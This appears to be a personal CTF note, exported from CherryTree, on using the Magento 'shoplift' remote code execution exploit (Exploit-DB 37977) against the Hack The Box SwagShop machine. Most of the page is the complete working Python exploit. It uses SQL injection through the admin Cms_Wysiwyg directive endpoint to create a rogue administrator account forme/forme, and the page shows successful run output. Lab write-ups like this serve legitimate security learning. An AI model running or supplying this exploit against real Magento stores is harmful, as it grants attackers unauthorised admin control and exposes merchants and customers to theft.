<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Magento eCommerce - RCE</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Magento eCommerce - RCE</h1></strong><br /><a href="https://www.exploit-db.com/exploits/37977">https://www.exploit-db.com/exploits/37977</a><br /><br /><strong>Examples</strong><br />• hackthebox SwagShop<br /><br />Whilst the title of this script does say ‘Remote Code Execution’, if you read the contents of the script you&#39;ll learn that what it actually does is create an admin user with the credentials <code>forme / forme</code> (via remote code execution).<br /><br />Parts of the script need editing.<br /><br />You&#39;ll see from this line:<br /><div class="codebox"><div class="codebox">target_url&nbsp;=&nbsp;target&nbsp;+&nbsp;&quot;/admin/Cms_Wysiwyg/directive/index/&quot;</div></div><br />that the exploit is targeting <code>/admin/Cms_Wysiwyg/directive/index/</code><br /><br />We know from our gobuster scan earlier that the <code>/admin</code> directory is located <code>http://10.10.10.140/index.php</code><br />So this line:<br /><div class="codebox"><div class="codebox">target&nbsp;=&nbsp;&quot;http://target.com/&quot;</div></div><br /><br />Needs to be modified to this:<br /><div class="codebox"><div class="codebox">target&nbsp;=&nbsp;&quot;http://10.10.10.140/index.php&quot;</div></div><br /><br />You&#39;ll also need to comment out or delete the exploit info at the top and bottom of the script.<br />My whole exploit looked like this:<br /><div class="codebox"><div class="codebox">&#39;&#39;&#39;<br />////////////////////////<br />///&nbsp;Overview:<br />////////////////////////<br /><br />Magento&nbsp;shoplift&nbsp;bug&nbsp;originally&nbsp;discovered&nbsp;by&nbsp;CheckPoint&nbsp;team&nbsp;(http://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/)<br />This&nbsp;python&nbsp;script&nbsp;developed&nbsp;by&nbsp;joren&nbsp;but&nbsp;it&nbsp;was&nbsp;having&nbsp;some&nbsp;bug&nbsp;because&nbsp;of&nbsp;which&nbsp;it&nbsp;was&nbsp;not&nbsp;working&nbsp;properly.<br />If&nbsp;magento&nbsp;version&nbsp;is&nbsp;vulnerable,&nbsp;this&nbsp;script&nbsp;will&nbsp;create&nbsp;admin&nbsp;account&nbsp;with&nbsp;username&nbsp;forme&nbsp;and&nbsp;password&nbsp;forme<br /><br />////////////////<br />///&nbsp;&nbsp;POC&nbsp;&nbsp;&nbsp;////<br />///////////////<br />Exploit&nbsp;script&nbsp;starts&nbsp;here<br />///////////////////<br />&#39;&#39;&#39;<br />#Thanks&nbsp;to<br />#&nbsp;Zero&nbsp;cool,&nbsp;code&nbsp;breaker&nbsp;ICA,&nbsp;Team&nbsp;indishell,&nbsp;my&nbsp;father&nbsp;,&nbsp;rr&nbsp;mam,&nbsp;jagriti&nbsp;and&nbsp;DON&nbsp;&nbsp;<br />import&nbsp;requests<br />import&nbsp;base64<br />import&nbsp;sys<br /><br />target&nbsp;=&nbsp;&quot;http://10.10.10.140/index.php&quot;<br /><br />if&nbsp;not&nbsp;target.startswith(&quot;http&quot;):<br />&nbsp;&nbsp;&nbsp;&nbsp;target&nbsp;=&nbsp;&quot;http://&quot;&nbsp;+&nbsp;target<br /><br />if&nbsp;target.endswith(&quot;/&quot;):<br />&nbsp;&nbsp;&nbsp;&nbsp;target&nbsp;=&nbsp;target[:-1]<br /><br />target_url&nbsp;=&nbsp;target&nbsp;+&nbsp;&quot;/admin/Cms_Wysiwyg/directive/index/&quot;<br /><br />q=&quot;&quot;&quot;<br />SET&nbsp;@SALT&nbsp;=&nbsp;&#39;rp&#39;;<br />SET&nbsp;@PASS&nbsp;=&nbsp;CONCAT(MD5(CONCAT(&nbsp;@SALT&nbsp;,&nbsp;&#39;{password}&#39;)&nbsp;),&nbsp;CONCAT(&#39;:&#39;,&nbsp;@SALT&nbsp;));<br />SELECT&nbsp;@EXTRA&nbsp;:=&nbsp;MAX(extra)&nbsp;FROM&nbsp;admin_user&nbsp;WHERE&nbsp;extra&nbsp;IS&nbsp;NOT&nbsp;NULL;<br />INSERT&nbsp;INTO&nbsp;`admin_user`&nbsp;(`firstname`,&nbsp;`lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`)&nbsp;VALUES&nbsp;(&#39;Firstname&#39;,&#39;Lastname&#39;,&#39;email@example.com&#39;,&#39;{username}&#39;,@PASS,NOW(),0,0,1,@EXTRA,NULL,&nbsp;NOW());<br />INSERT&nbsp;INTO&nbsp;`admin_role`&nbsp;(parent_id,tree_level,sort_order,role_type,user_id,role_name)&nbsp;VALUES&nbsp;(1,2,0,&#39;U&#39;,(SELECT&nbsp;user_id&nbsp;FROM&nbsp;admin_user&nbsp;WHERE&nbsp;username&nbsp;=&nbsp;&#39;{username}&#39;),&#39;Firstname&#39;);<br />&quot;&quot;&quot;<br /><br /><br />query&nbsp;=&nbsp;q.replace(&quot;\n&quot;,&nbsp;&quot;&quot;).format(username=&quot;forme&quot;,&nbsp;password=&quot;forme&quot;)<br />pfilter&nbsp;=&nbsp;&quot;popularity[from]=0&amp;popularity[to]=3&amp;popularity[field_expr]=0);{0}&quot;.format(query)<br /><br />#&nbsp;e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&nbsp;decoded&nbsp;is{{block&nbsp;type=Adminhtml/report_search_grid&nbsp;output=getCsvFile}}<br />r&nbsp;=&nbsp;requests.post(target_url,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data={&quot;___directive&quot;:&nbsp;&quot;e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&quot;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;filter&quot;:&nbsp;base64.b64encode(pfilter),<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;forwarded&quot;:&nbsp;1})<br />if&nbsp;r.ok:<br />&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;WORKED&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Check&nbsp;{0}/admin&nbsp;with&nbsp;creds&nbsp;forme:forme&quot;.format(target)<br />else:<br />&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;DID&nbsp;NOT&nbsp;WORK&quot;<br /></div></div><br /><br />Run it and you should be informed that it WORKED.<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/swagshop/80http/exploits#&nbsp;python&nbsp;37977.py<br />WORKED<br />Check&nbsp;http://10.10.10.140/index.php/admin&nbsp;with&nbsp;creds&nbsp;forme:forme</div></div><br /><br /></div>
</body>
</html>
